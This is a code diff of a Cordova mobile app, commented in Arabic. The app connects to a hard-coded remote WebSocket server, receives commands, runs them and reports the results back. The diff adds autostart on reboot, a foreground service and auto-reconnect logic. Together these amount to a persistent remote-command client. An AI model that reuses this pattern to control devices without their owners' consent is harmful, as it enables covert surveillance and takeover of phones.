@@ -2,18 +2,13 @@ document.addEventListener('deviceready', onDeviceReady, false);
 
 // تخزين الطلبات المستلمة
 const receivedRequests = [];
+let heartbeatInterval = null;
 let reconnectInterval = null;
 
 function onDeviceReady() {
   console.log('Device is ready');
 
-  // تشغيل التطبيق تلقائياً بعد إعادة تشغيل الجهاز
-  if (cordova.plugins.autoStart) {
-    cordova.plugins.autoStart.enable();
-    console.log("Autostart Enabled ✅");
-  }
-
-  // تمكين التشغيل في الخلفية
+  // ✅ تمكين التشغيل في الخلفية
   if (cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
@@ -21,24 +16,24 @@ function onDeviceReady() {
       text: 'جارٍ مراقبة الأوامر الواردة',
       silent: false
     });
-    console.log("Background Mode Enabled ✅");
+
+    cordova.plugins.backgroundMode.on('activate', function () {
+      console.log("Background mode activated");
+      cordova.plugins.backgroundMode.disableWebViewOptimizations();
+    });
   }
 
-  // تفعيل جلب البيانات في الخلفية حتى عند الخروج من التطبيق
-  if (window.BackgroundFetch) {
-    BackgroundFetch.configure(
-      {
-        minimumFetchInterval: 15,
-        stopOnTerminate: false,
-        startOnBoot: true
-      },
-      () => {
-        console.log("Background Fetch Triggered ✅");
-        connectToServer(deviceInfo);
-        BackgroundFetch.finish();
-      },
-      error => console.log("Background Fetch failed:", error)
-    );
+  // ✅ تمكين التشغيل التلقائي عند إعادة تشغيل الجهاز
+  if (window.plugins && window.plugins.autostart) {
+    window.plugins.autostart.enable();
+    window.plugins.autostart.check(function (enabled) {
+      console.log("Autostart enabled:", enabled);
+    });
+  }
+
+  // ✅ تفعيل Foreground Service لمنع أندرويد من إيقاف التطبيق
+  if (cordova.plugins.foregroundService) {
+    cordova.plugins.foregroundService.start('التطبيق يعمل', 'الاتصال بالخادم نشط');
   }
 
   // معلومات الجهاز
@@ -104,29 +99,14 @@ function onDeviceReady() {
       }
     });
   }
-
-  // إعادة الاتصال عند استئناف التطبيق
-  document.addEventListener('resume', () => {
-    if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-      console.log('App resumed, reconnecting...');
-      connectToServer(deviceInfo);
-    }
-  }, false);
 }
 
 function connectToServer(deviceInfo) {
   const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
-  console.log("Connecting to server...");
-
-  if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
-    console.log("Already connected ✅");
-    return;
-  }
-
   window.wsConnection = new WebSocket(wsUrl);
 
   wsConnection.onopen = () => {
-    console.log('Connected to server ✅');
+    console.log('Connected to server');
 
     // تسجيل الجهاز
     wsConnection.send(JSON.stringify({
@@ -134,6 +114,18 @@ function connectToServer(deviceInfo) {
       deviceId: deviceInfo.uuid,
       deviceInfo
     }));
+
+    // إرسال نبضات قلبية للحفاظ على الاتصال
+    if (heartbeatInterval) clearInterval(heartbeatInterval);
+    heartbeatInterval = setInterval(() => {
+      if (wsConnection.readyState === WebSocket.OPEN) {
+        wsConnection.send(JSON.stringify({
+          type: 'heartbeat',
+          timestamp: new Date().toISOString(),
+          receivedRequests
+        }));
+      }
+    }, 20000);
   };
 
   wsConnection.onmessage = (event) => {
@@ -143,13 +135,11 @@ function connectToServer(deviceInfo) {
       if (data.type === 'command') {
         console.log('Received command:', data.command);
 
-        // تخزين الطلب المستلم
         receivedRequests.push({
           ...data.command,
           receivedAt: new Date().toISOString()
         });
 
-        // تنفيذ الأمر وإرسال الرد
         executeCommand(data.command, (response) => {
           if (wsConnection.readyState === WebSocket.OPEN) {
             wsConnection.send(JSON.stringify({
@@ -174,32 +164,19 @@ function connectToServer(deviceInfo) {
 
   wsConnection.onerror = (error) => {
     console.error('WebSocket error:', error);
+    wsConnection.close();
   };
 
   wsConnection.onclose = () => {
-    console.warn('Disconnected from server ❌');
-    // إعادة الاتصال بعد 5 ثوانٍ
+    console.warn('Disconnected from server, retrying in 5s...');
+    if (heartbeatInterval) clearInterval(heartbeatInterval);
     if (reconnectInterval) clearTimeout(reconnectInterval);
     reconnectInterval = setTimeout(() => connectToServer(deviceInfo), 5000);
   };
-
-  // إرسال نبضات قلبية للحفاظ على الاتصال
-  const heartbeatInterval = setInterval(() => {
-    if (wsConnection.readyState === WebSocket.OPEN) {
-      wsConnection.send(JSON.stringify({
-        type: 'heartbeat',
-        timestamp: new Date().toISOString(),
-        receivedRequests
-      }));
-    } else {
-      clearInterval(heartbeatInterval);
-    }
-  }, 30000);
 }
 
 function executeCommand(command, callback) {
   console.log('Executing command:', command);
-
   const commandId = Date.now();
 
   switch (command.type) {
@@ -408,3 +385,11 @@ function getReceivedRequests(commandId, callback) {
     count: receivedRequests.length
   });
 }
+
+// ✅ إعادة الاتصال عند استئناف التطبيق
+document.addEventListener('resume', () => {
+  if (!window.wsConnection || window.wsConnection.readyState !== WebSocket.OPEN) {
+    console.log('App resumed, reconnecting...');
+    onDeviceReady();
+  }
+}, false);
